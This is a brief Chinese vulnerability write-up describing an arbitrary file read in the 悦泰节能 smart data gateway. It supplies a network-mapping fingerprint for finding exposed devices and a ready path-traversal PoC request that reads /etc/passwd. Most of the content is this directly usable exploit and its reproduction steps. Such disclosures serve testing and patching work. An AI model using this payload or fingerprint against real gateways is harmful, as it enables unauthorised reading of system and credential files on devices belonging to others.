# 悦泰节能 智能数据网关 resources 任意文件读取漏洞

## 漏洞描述

悦泰节能 智能数据网关存在任意文件读取漏洞，通过构造特殊请求可以读取服务器任意文件

## 漏洞影响

```
悦泰节能 智能数据网关
```

## 网络测绘

```
body="/FWlib3/resources/css/xtheme-gray.cssz"
```

## 漏洞复现

登录页面

![](images/202202162249593.png)

验证POC

```php
/FWlib3/resources//../../../../../../../../etc/passwd
```

![img](images/202202162249623.png)